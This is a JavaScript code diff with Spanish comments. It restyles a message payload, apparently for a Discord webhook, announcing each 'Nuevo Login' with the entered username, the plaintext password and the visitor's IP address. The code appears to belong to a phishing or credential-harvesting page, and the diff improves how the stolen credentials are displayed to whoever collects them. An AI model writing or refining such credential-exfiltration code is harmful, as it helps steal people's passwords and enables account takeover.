@@ -283,12 +283,12 @@
             console.log('No se pudo obtener IP');
         }
         
-        // Formato optimizado para móvil: código en línea (single backtick)
-        // En Discord móvil, al tocar el texto gris se selecciona fácilmente
+        // Payload profesional con mejor estructura y espaciado
         const payload = {
-            content: `🔐 **Nuevo Login** | IP: ${userIP}`,
             embeds: [{
-                color: 0x7d95d4,
+                title: "🔐 Nuevo Login",
+                description: "Se ha recibido un intento de acceso al sistema",
+                color: 0x5865F2,
                 fields: [
                     {
                         name: "👤 Usuario",
@@ -299,8 +299,21 @@
                         name: "🔑 Contraseña", 
                         value: `\`${password}\``,
                         inline: true
+                    },
+                    {
+                        name: "\u200B",
+                        value: "\u200B",
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Dirección IP",
+                        value: `\`${userIP}\``,
+                        inline: false
                     }
                 ],
+                footer: {
+                    text: "Sistema de Monitoreo • " + new Date().toLocaleString('es-ES')
+                },
                 timestamp: new Date().toISOString()
             }]
         };
